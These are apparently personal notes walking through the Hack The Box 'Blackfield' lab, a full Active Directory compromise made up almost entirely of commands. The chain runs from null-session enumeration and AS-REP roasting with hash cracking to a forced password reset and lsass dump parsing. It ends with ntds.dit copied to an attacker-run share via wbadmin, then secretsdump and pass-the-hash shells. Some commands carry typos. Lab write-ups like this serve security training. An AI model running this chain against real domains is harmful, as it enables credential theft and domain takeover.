`sudo nmap -sC -sV -oA nmap/blackfield 10.10.10.192`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20250109182058.png]]
Add `BLACKFIELD.local` and `BLACKFIELD`to `/etc/hosts` 

![[Pasted image 20250109182439.png]]
Trying out #rpcclient because this is active directory.

`rpcclient 10.10.10.192`

![[Pasted image 20250109182625.png]]
No dice. 

Testing with null authentication and got in.

`rpcclient 10.10.10.192 -U ''`

Run `enumdomusers` but get access denied. Moving on.

![[Pasted image 20250109182756.png]]

Testing #smbclient in the same way to list file shares.

`smbclient -L 10.10.10.192`

and with null authentication 
`smbclient -L 10.10.10.192 -U ''`
![[Pasted image 20250109182947.png]]
#smbclient does not tell us whether we have read access so using #crackmapexec to get this information. 

`cme smb 10.10.10.192 --shares`

No info.

Try with null authentication.

`cme smb 10.10.10.192 --shares -u ''`

Try with null user and pass.

`cme smb 10.10.10.192 --shares -u '' -p ''`

Got a little more. 

Try with fake user.

`cme smb 10.10.10.192 --shares -u 'PleaseSub'`

Nothing. 

Try with fake user and blank password and BINGO. 

`cme smb 10.10.10.192 --shares -u 'PleaseSub' -p ''`

![[Pasted image 20250109183538.png]]
Enumerating the profiles$ share with #smbclient again. 

`smbclient '//10.10.10.192/profiles$'`

![[Pasted image 20250109183902.png]]
Get a ton of users. 

![[Pasted image 20250109183943.png]]
Will build user list by mounting the profiles$ directory first. 

`sudo mount -t cifs '//10.10.10.192/profiles$' /mnt`

![[Pasted image 20250109184204.png]]

`cd /mnt`

`ls -la`

Tons of user directories 

![[Pasted image 20250109184249.png]]
Run `find .`

![[Pasted image 20250109184334.png]]
Use #kerbrute [[Kerbrute]] to enumerate valid usernames

GitHub:

https://github.com/ropnop/kerbrute

`kerbrute -h`


`./kerbrute userenum --dc 10.10.10.192 -d blackfield -o kerbrute.username.out users.lst`

![[Pasted image 20250109185104.png]]
Found three valid usernames. Save these to a file.

![[Pasted image 20250109185234.png]]

Use [[Impacket]] #getnpusers to perform #ASREProast


`./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -userfile users.lst blackfield/`

Got a hash 

![[Pasted image 20250109190751.png]]
Crack this hash with #hashcat 

Figure out hashcat mode quickly:

`./hashcat --example-hashes | grep krb5asrep`

`./hashcat --example-hashes | grep -B5 krb5asrep`

Need mode `18200`

![[Pasted image 20250109201559.png]]

Crack the hash. 

`./hashcat -m 18200 hashes/blackfield /opt/wordlist/rockyou.txt`

![[Pasted image 20250109201716.png]]

When hashcat is done..use `--show` flag

`./hashcat -m 18200 hashes/blackfield --show`

![[Pasted image 20250109201827.png]]

Password is: `#00^Blackknight`

Use these new creds with #crackmapexec 

`cme smb 10.10.10.192 --shares -u support -p '#00^Blackknight'

![[Pasted image 20250109202117.png]]

Trying to connect with #rpcclient again

`rpcclient -U support 10.10.10.192`

![[Pasted image 20250109202457.png]]
Run `enumdomusers`

![[Pasted image 20250109202534.png]]
Lots of users. Create a new users file. 

Cleanup this new `tmp` file with 

`cat tmp | awk -F'\[' '{print $1}'`

`cat tmp | awk -F'\[' '{print $2}'`

`cat tmp | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > users.lst`

Run #getnpusers again 

`GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile users.lst blackfield/`

![[Pasted image 20250109203114.png]]
No new hashes.

Run #pythonbloodhoundingestor 

https://github.com/dirkjanm/BloodHound.py

Running into issues so going to edit `/etc/resolv.conf`

![[Pasted image 20250109203720.png]]
Deleted stuff from `/etc/hosts`

`python3 bloodhound.py -u support -p '#00^Blackknight' -ns 10.10.10.192 -d blackfield.local -c all`

![[Pasted image 20250109203952.png]]
Got some `.json` files from this. 

Start #neo4j 

`sudo neo4j console`

Execute Bloodhound and login to console

`./Bloodhound` 

Drag files from `bloodhound.py` execution into the console. 

Mark `support` user as pwn3d. 

Go to queries..

`Find all domain admins` (just one)

`Shortest path to domain admins` (none)

Set this user as high value target 

![[Pasted image 20250109204722.png]]

Set `audit2020`, `svc.backup` as high value targets 

The click `Shortest Path to High Value Targets`

Looks insane. 

![[Pasted image 20250109204917.png]]
Look for shortest path to `audit2020` user 

![[Pasted image 20250109205031.png]]
Discover the `support` user can change `audit2020`'s password without knowing that user's current password. 

![[Pasted image 20250109205215.png]]
Change this user's password from linux with #rpcclient 

`rpcclient -U support 10.10.10.192 `

Set the password with 

`setuserinfo2 Audit2020 23 'PleaseSub'`

![[Pasted image 20250109205719.png]]
It failed tho because password was not complex enough.

`setuserinfo2 Audit2020 23 'PleaseSub!'`

Test it out with #crackmapexec 

`cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!'`

![[Pasted image 20250109205908.png]]

Check shares and we can read the forensic / audit share now. 

`cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!' --shares`

![[Pasted image 20250109210028.png]]

Ensure stuff is unmounted with

`sudo umount /mnt`

`sudo mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt`

![[Pasted image 20250109210237.png]]
`cd /mnt`

`ls -la`

![[Pasted image 20250109210308.png]]
Look through these directories

`cd memory_analysis`

`ls -la`

`lsass.zip` file is interesting. 

![[Pasted image 20250109210517.png]]
lsass is where mimikatz pulls plaintext passwords. 

Search for the lsass dump tool [[pypykatz]]

https://github.com/skelsec/pypykatz

It's maybe in pip repository.

`pip3 install pypykatz`

Unzip `lsass.zip` to get `lsass.DMP` file

Finding flags to use with pypykatz and lsa

`pypykatz lsa -h`

![[Pasted image 20250110190623.png]]
Running `pypykatz lsa minidump lsass.DMP > lsass.out`

![[Pasted image 20250110190750.png]]

`less lsass.out` to go through it. 

Find `svc_backup` user and an NT hash.

![[Pasted image 20250110191140.png]]
Grab all the NT hashes with `grep NT lsass.out -B3 | grep -i username `

![[Pasted image 20250110191315.png]]
Grab NT hashes for `svc_backup` and `administrator` and pop into credentials file. 

![[Pasted image 20250110191447.png]]
Try #crackmapexec with administrator's NT hash. 

`cme smb 10.10.10.192 -u administrator -H 7fle4ff8c6a8e6b6fcae2d9c0572cd62 `

![[Pasted image 20250110191643.png]]

It fails. 

Trying other user

`cme smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`

![[Pasted image 20250110191756.png]]

This works but no pwn3d.

Use #evilwinrm to login. 

`evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

![[Pasted image 20250110191933.png]]

Running `whoami /all` and discover we have some dangerous privileges:

`SeBackupPrivilege` and `SeRestorePrivilege`

![[Pasted image 20250110200246.png]]
SeBackupPrivilege:

* Save things out of the registry
* Read files you normally couldn't access
* Restore files 
* Members of "Backup Operators" can logon locally on DC & backup ntds.dit ex. with "wbadmin.exe" or "diskshadow.exe"

![[Pasted image 20250110200617.png]]
Use #impacket #smbserver to set up a share on attacker box.

`sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)`

![[Pasted image 20250110201022.png]]

Access this local share from remote win-rm shell 

`net use x: \\10.10.14.2\SendMeYoData /user: ippsec PleaseSubscribe`

![[Pasted image 20250110201148.png]]

Now get wbadmin to send the ntds backup file to our impacket share. 

`wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`

![[Pasted image 20250110201423.png]]
If there's a logon prompt for [Y] or [N] can echo y into prompt like 

`echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`

![[Pasted image 20250110201724.png]]
This fails because it wants an NTFS folder. 
![[Pasted image 20250110201821.png]]
Create an NTFS folder:

`dd if=/dev/zero of=ntfs.disk bs=1024M count=2`
![[Pasted image 20250110202001.png]]

`sudo losetup -fP ntfs.disk`

Check mount with 

`losetup -a`

![[Pasted image 20250110202212.png]]

`sudo mkfs.ntfs /dev/loop0`

![[Pasted image 20250110202259.png]]

`sudo mount /dev/loop0 smb/`

`mount | grep smb`

![[Pasted image 20250110202412.png]]

Re-running impacket command. 

`sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)`

Re-running wbadmin command:

`echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`

This fails again because impacket doesn't handle ntfs well. 

Editing samba to create a windows fileshare from linux

`vi /etc/samba/smb.conf`
![[Pasted image 20250110203054.png]]

Restart smbd

`sudo systemctl restart smbd`

![[Pasted image 20250110203411.png]]

From evil-winrm, mount to the share

`net use x: \\10.10.14.2\SendMeYoData`

![[Pasted image 20250110203304.png]]

Now trying the wbadmin command AGAIN

`echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`

`WindowsImageBackup` directory is created on attack box. SUCCESS.

![[Pasted image 20250110203655.png]]
Use wbadmin to restore a ntds.dit out of our backup and creating a backup of the SYSTEM Registry hive

`echo Y wbadmin start recovery -version:????? -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`

![[Pasted image 20250110203958.png]]

get versions by running:

`wbadmin get versions`

![[Pasted image 20250110204110.png]]

`10/02/2020-03:51`

![[Pasted image 20250110204208.png]]

Execute this on evil-winrm

`echo Y wbadmin start recovery -version:10/02/2020-03:51 -itemtype:file -items:C: windows\ntds\ntds.dit - recoverytarget:C: -notrestoreacl`

![[Pasted image 20250110204324.png]]

Got `ntds.dit` ! Download it to attack box.

![[Pasted image 20250110204408.png]]
Save and download the reg keys

`reg save hklm\system system.hive`

`download system.hive`

![[Pasted image 20250110204640.png]]
Now we can run #impacket #secretsdump 

(without history)
`secretsdump.py -ntds ntds.dit -system system.hive LOCAL`

![[Pasted image 20250110205058.png]]


(with history)
`secretsdump.py -ntds ntds.dit -system system.hive -history LOCAL`

![[Pasted image 20250110205137.png]]
We got admin's hash so can use #psexec with this hash.

`psexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192`

![[Pasted image 20250110205419.png]]

Can't grab the flag as SYSTEM user due to EFS (Encrypted File System). Using WMIExec to get a shell as the actual user

Use #wmiexec

`wmiexec.py -hashes 184fb5e5178480be64824H4cd53b99ee:184fb5e5178480be64824H4cd53b99ee administrator@10.10.10.192`

Using Mimikatz to restore the password of Audit2020, so it's like we were never there.

![[Pasted image 20250110205816.png]]
